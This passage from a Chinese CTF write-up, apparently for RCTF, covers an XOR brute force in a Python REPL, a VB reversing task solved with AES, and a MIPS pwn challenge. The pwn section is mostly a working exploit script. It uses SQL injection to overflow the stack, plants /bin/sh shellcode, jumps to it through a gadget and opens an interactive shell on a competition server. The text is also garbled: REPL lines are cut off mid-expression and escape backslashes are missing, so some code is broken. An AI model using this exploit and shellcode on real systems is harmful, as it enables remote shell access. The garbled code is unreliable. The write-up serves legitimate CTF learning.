        if ord(c3[0])^i+1==ord(c3[i]^i):
    TypeError: unsupported operand type(s) for ^: 'str' and 'int'
    >>> for i in range(128):
        if i==0:
            continue
        if ord(c3[0])^i+1==ord(c3[i]^i):
            if 2*i", line 4, in 
        if ord(c3[0])^i+1==ord(c3[i]^i):
    TypeError: unsupported operand type(s) for ^: 'str' and 'int'
    >>> for i in range(128):
        if i==0:
            continue
        if ord(c3[0])^i+1==ord(c3[i])^i:
            if 2*i>> for i in range(128):
        if i==0:
            continue
        if i+1>> for i in range(128):
        if i==0:
            continue
        if i+1>> c4=''
    >>> for ch in c3:
        c4+=chr(ord(ch)^18)
    >>> c4
    'Ui04^mR^A^d`rx^@RLx0cTh37alUa@agcu{aCUOx0fWk26`oT`C`fbtz`BTNx0eVj59cnWcBciew}cEWQx11Ym48bqVbEbhdv|bDVPx10Xl7;epYeDekgyx7feGYSx13[o6:dsXdGdjfx~'
    >>> for i in range(128):
        if i==0:
            continue
        if i>> c4=''
    >>> for ch in c3:
        c4+=chr(ord(ch)^19)
    >>> c4
    'Th15_lS_@_easy_ASMrUi26`mT`A`fbtz`BTNx0eVj37anUaBagcu{aCUOx0fWk48boVbCbhdv|bDVPx10Xl59cpWcDciew}cEWQx11Ym6:dqXdEdjfx~dFXRx12Zn7;erYeFekgyx7f'
    >>> c4[19]
    'U'
    >>>
**VB (REVERSE 300)  
**
拿到一个 VB 程序,用 VB Decompilier
看一下可以得到大致逻辑,可以看到进行了某种加密操作然后进行比较,用ollydbg下断点可以看到用户输入的加密结果。
经过简单尝试可以发现,程序的块大小为 128 bit,找到一个很像 key 的 }@$&]_#{a_b*lr=(,大小也为 128
bit,而且两个块之间不会互相影响,可知是ECB模式。于是找了下符合条件的块加密算法,试了下都不太对。
然后就一直在OD里面动态跟,发现某处对key作了一些改动,得到的key变为 ~C'%^ xba)oq>\+ (hex:7E 43 27 25 5E 5C
20 78 62 5C 61 29 6F 71 3E 2B),后面就用这个 key 再生成子 key 了。
于是拿这个 key 用 AES 解密了一下,还不太对。继续动态跟发现似乎还把结果十六进制字符串逆着排了一下,于是我们也把比较字符串再逆回去解密,就得到
RCTF{VB6_i5_3a5y_rIgHt}x00……去掉末尾 x00 就是 flag。
所以为什么 VB Decompilier 看到的类名是 clsDes?
**keys (PWN 600)  
**
蛋疼的 MIPS ……
一个函数里面,把 SQL 查出来的值 strcpy 到栈上了,于是可以 SQL 注入构造一个超长的,溢出。
栈上 + 0x24 处恰好有个地方指向 output 数组,提前控制使得 output 为 shellcode,然后找个跳到 sp + 0x24 处的
gadget。
要注意的是 shellcode 种进去之后,下一个操作的时候故意拖延一下,让他服务里的 read block 住,触发 context
switch,刷缓存。
总而言之,细节一堆废话写的累,哪次有空了再来写吧,先还是贴程序(调试的东西都懒得整理了):
    from utils import *
    context(log_level = 'debug')
    r = remote('59.77.135.196', 20006)
    #payload = 'x52' * 0x1000
    #payload = ''.join(map(chr,range(0x10, 256))).ljust(0x1000, 'x52')
    payload = 'A' * 0x1000
    r.sendline(payload)
    r.recvline()
    r.recvn(0x1000)
    tab = '000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f202122232425262728292a2b2c2d2e2f343536373831323334353a3b3c3d3e3f404e4f505152535455565758595a4142434445464748494a4b4c4d5b5c5d5e5f606e6f707172737475767778797a6162636465666768696a6b6c6d7b7c7d7e7f808182838485868788898a8b8c8d8e8f909192939495969798999a9b9c9d9e9fa0a1a2a3a4a5a6a7a8a9aaabacadaeafb0b1b2b3b4b5b6b7b8b9babbbcbdbebfc0c1c2c3c4c5c6c7c8c9cacbcccdcecfd0d1d2d3d4d5d6d7d8d9dadbdcdddedfe0e1e2e3e4e5e6e7e8e9eaebecedeeeff0f1f2f3f4f5f6f7f8f9fafbfcfdfeff'.decode('hex')
    stkaddr = u32(r.recvn(4)) #u32(''.join(map(lambda x: chr(tab.index(x)), r.recvn(4))))
    mid__uClibc_main = u32(r.recvn(4)) #u32(''.join(map(lambda x: chr(tab.index(x)), r.recvn(4))))
    log.success('Some stack address: %s' % hex(stkaddr))
    log.success('Mid __uClibc_main: %s' % hex(mid__uClibc_main))
    debug = 0x004022A4
    main = 0x4014D4
    #payload = 'A' * 0x200 + 'x54' + 'x42'
    #plain = "'" + "A" * 600 + "'"
    #plain = "load_extension('libc.so.0', 'system')"
    #plain = 'sqlite_version()'
    ''' Pivot! +0x9C is also controlled..
    .text:00401C48                 lw      $ra, 0x9C($sp)   # Load Word
    .text:00401C4C                 lw      $fp, 0x98($sp)   # Load Word
    .text:00401C50                 addiu   $sp, 0xA0        # Add Immediate Unsigned
    .text:00401C54                 jr      $ra              # Jump Register
    .text:00401C58                 nop
    '''
    # 0x20 + 0x20 + 0x18
    # For debug purpose
    #shellcode = 'a4220224000000004000023c000000000800400000000000'.decode('hex')
    shellcode = '66060624ffffd004ffff0628e0ffbd270110e4271ff08424e8ffa4afecffa0afe8ffa527ab0f02240c0101012f62696e2f7368'.decode('hex')
    shellcode = '57044220'.decode('hex') * ((0x1000-len(shellcode))/4) + shellcode
    log.info('Shellcode length: %d' % len(shellcode))
    log.info('Encoded shellcode: %s' % shellcode.encode('hex'))
    payload = shellcode
    r.sendline(payload)
    r.recvuntil('/bin/sh')
    # time.sleep(5.0) # Wait 5 seconds to block "read" syscall
    target = stkaddr - 0x2248 + 0x1240 + 0x400
    #target = stkaddr - 0x2248 - 0x20
    #prefix = 'A' * (0x9C - 0x54) + p32(target) + p32(0x4012D4)
    prefix = 'A' * (0x9C - 0x58) + p32(target)
    #prefix = p32(debug) * (0x200 / 4)
    assert len(prefix) <= 0x200
    plain = "hex(zeroblob(293))||CHAR(0x41,0x41, 0x54,0x0C,0x40,0)"
    payload = prefix.ljust(0x200, 'x00') + 'x54' + 'x41' + "' UNION SELECT " + plain + " --"
    for i in xrange(10):
        r.send(payload[i])
        time.sleep(0.3)
    r.sendline(payload[10:])
    r.recvuntil('x54x0cx40')
    #r.sendline(payload)
    r.sendline('pwd')
    r.recvuntil('/')
    r.interactive()
    #r.recvall()
**not sequence (REVERSE 100)  
**
用 ida 查看 elf 文件, 查看其中两个 check 过程, 当中分别对输入数组进行了校验.
手动将求和的方程列出, 求解得到前 20 个元素, 发现为杨辉三角形.
结合 Count=20 的条件, 将 0~210 个元素作为输入, 获得正确输出.
去掉空格后求 md5 即为 flag.
**Where (MOBILE 300)  
**